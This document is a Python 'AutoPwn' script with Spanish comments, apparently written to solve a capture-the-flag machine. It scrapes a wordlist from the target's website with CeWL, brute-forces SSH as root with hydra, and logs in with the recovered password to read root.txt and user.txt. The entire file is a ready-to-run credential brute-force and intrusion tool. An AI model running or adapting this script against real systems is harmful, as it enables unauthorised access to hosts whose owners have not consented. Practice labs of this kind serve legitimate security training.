#!/usr/bin/python3

import os
import re
import subprocess
import argparse
import paramiko
from colorama import Fore, Style
import sys

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address
        self.lport = lport

    def run(self):
        # Generar el diccionario de contraseñas con cewl
        output = subprocess.check_output(f"/opt/CeWL/cewl --with-numbers {self.ip_address} -w dicPage", shell=True, text=True)

        # Filtrar la línea no deseada
        filtered_output = "\n".join(line for line in output.splitlines() if "CeWL" not in line)

        # Imprimir el resultado filtrado
       
        # Ejecutar el ataque de fuerza bruta con hydra
        hydra_command = f"sudo hydra -t 2 -P dicPage -l root ssh://{self.ip_address} -f"
        result = os.popen(hydra_command).read()

        # Extraer el usuario y la contraseña utilizando expresiones regulares
        matches = re.findall(r'login: (\S+)\s+password: (\S+)', result)
        if matches:
            for username, password in matches:
                # Conexión SSH
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                try:
                    ssh.connect(self.ip_address, username=username, password=password)

                    # Ejecutar comando remoto para obtener root.txt
                    stdin, stdout, stderr = ssh.exec_command('cat /root/root.txt')
                    output = stdout.read().decode('utf-8').strip()

                    # Imprimir el resultado
                    sys.stdout.write(Fore.GREEN + f"El contenido de 'root.txt': {output}\n")
                    sys.stdout.flush()

                    # Ejecutar comando remoto para obtener user.txt
                    stdin, stdout, stderr = ssh.exec_command('cat /root/user.txt')
                    output = stdout.read().decode('utf-8').strip()

                    # Imprimir el resultado
                    sys.stdout.write(Fore.GREEN + f"El contenido de 'user.txt': {output}\n")
                    sys.stdout.flush()

                except paramiko.AuthenticationException:
                    pass

                finally:
                    if ssh.get_transport().is_active():
                        ssh.close()
        else:
            sys.stdout.write(Fore.RED + "No se encontraron coincidencias de usuario y contraseña.\n")
            sys.stdout.flush()

def get_arguments():
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    parser.add_argument('-p', '--port', default=22, dest='lport', required=False, help='Proporcionar puerto.')
    return parser.parse_args()

def main():
    args = get_arguments()
    exploit = Exploit(args.ip_address, args.lport)
    exploit.run()

if __name__ == '__main__':
    main()

